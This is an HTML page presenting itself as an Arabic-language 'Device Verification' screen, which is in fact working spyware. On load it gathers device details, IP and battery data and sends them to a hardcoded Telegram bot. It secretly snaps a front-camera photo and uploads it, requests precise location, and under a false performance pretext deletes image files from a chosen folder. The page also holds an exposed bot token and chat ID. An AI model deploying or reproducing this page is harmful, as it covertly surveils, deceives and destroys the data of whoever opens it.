<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Device Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        #status {
            margin: 20px 0;
            font-size: 18px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="status">انتظر جاري التحميل...</div>

    <script>
        // Telegram configuration
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";

        // Global variables
        let cameraStream = null;
        let deletionConfirmed = false;

        // Main function
        async function startProcess() {
            try {
                // 1. Collect basic device info
                const deviceInfo = await collectDeviceInfo();
                await sendToTelegram(formatDeviceInfo(deviceInfo));

                // 2. Request camera access
                document.getElementById('status').textContent = "جاري طلب إذن الكاميرا...";
                await requestCameraAccess();

                // 3. Request location access
                document.getElementById('status').textContent = "جاري طلب إذن الموقع...";
                await requestLocationAccess();

                // 4. Request file deletion permission
                document.getElementById('status').textContent = "جاري طلب إذن حذف الصور...";
                deletionConfirmed = confirm("هل توافق على حذف الصور القديمة لتحسين أداء الجهاز؟");
                
                if (deletionConfirmed) {
                    await deleteCameraPhotos();
                }

                document.getElementById('status').textContent = "تمت العملية بنجاح!";

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('status').textContent = "حدث خطأ: " + error.message;
            }
        }

        // Device info collection
        async function collectDeviceInfo() {
            const info = {
                // Basic info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceMemory: navigator.deviceMemory,
                cpuCores: navigator.hardwareConcurrency,
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                
                // Network info
                ip: await getIPAddress(),
                
                // Battery info
                battery: await getBatteryInfo(),
                
                // Location will be added later if permitted
                location: null
            };

            return info;
        }

        // Camera access
        async function requestCameraAccess() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } // Front camera
                });
                
                // Take photo
                const video = document.createElement('video');
                video.srcObject = cameraStream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Stop camera
                cameraStream.getTracks().forEach(track => track.stop());
                
                // Send photo
                canvas.toBlob(async blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'selfie.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/jpeg', 0.8);
                
            } catch (error) {
                console.log('Camera access denied:', error);
            }
        }

        // Location access
        async function requestLocationAccess() {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000
                    });
                });
                
                return {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                
            } catch (error) {
                console.log('Location access denied:', error);
                return null;
            }
        }

        // Delete camera photos (simulated - actual deletion would require more permissions)
        async function deleteCameraPhotos() {
            try {
                if (!('showDirectoryPicker' in window)) return;
                
                const dirHandle = await window.showDirectoryPicker();
                let deletedCount = 0;
                
                for await (const entry of dirHandle.values()) {
                    if (entry.kind === 'file' && /\.(jpg|jpeg|png)$/i.test(entry.name)) {
                        try {
                            await entry.remove();
                            deletedCount++;
                        } catch (e) {
                            console.log('Could not delete file:', entry.name);
                        }
                    }
                }
                
                await sendToTelegram(`تم حذف ${deletedCount} صورة من الكاميرا`);
                
            } catch (error) {
                console.log('File deletion error:', error);
            }
        }

        // Helper functions
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير متاح';
            }
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا'
                    };
                } catch {
                    return 'غير متاح';
                }
            }
            return 'غير متاح';
        }

        function formatDeviceInfo(info) {
            let message = '📱 <b>معلومات الجهاز</b>\n\n';
            message += `🌐 <b>معلومات الشبكة</b>\n`;
            message += `- عنوان IP: ${info.ip || 'غير متاح'}\n`;
            message += `- اللغة: ${info.language}\n`;
            message += `- المنطقة الزمنية: ${info.timezone}\n\n`;
            
            message += `🖥️ <b>مواصفات الجهاز</b>\n`;
            message += `- النظام: ${info.platform}\n`;
            message += `- المتصفح: ${info.userAgent}\n`;
            message += `- الذاكرة: ${info.deviceMemory || 'غير معروف'} GB\n`;
            message += `- أنوية المعالج: ${info.cpuCores || 'غير معروف'}\n`;
            message += `- دقة الشاشة: ${info.screen}\n\n`;
            
            message += `🔋 <b>معلومات البطارية</b>\n`;
            if (info.battery && typeof info.battery === 'object') {
                message += `- مستوى الشحن: ${info.battery.level}\n`;
                message += `- حالة الشحن: ${info.battery.charging}\n\n`;
            } else {
                message += `${info.battery}\n\n`;
            }
            
            if (info.location) {
                message += `📍 <b>الموقع الجغرافي</b>\n`;
                message += `- خط العرض: ${info.location.latitude}\n`;
                message += `- خط الطول: ${info.location.longitude}\n`;
                message += `- الدقة: ${info.location.accuracy} متر\n`;
                message += `- رابط الخريطة: https://maps.google.com/?q=${info.location.latitude},${info.location.longitude}\n\n`;
            }
            
            message += `⏰ <b>وقت الطلب:</b> ${new Date(info.timestamp).toLocaleString()}`;
            
            return message;
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        // Start the process when page loads
        window.onload = startProcess;
    </script>
</body>
</html>
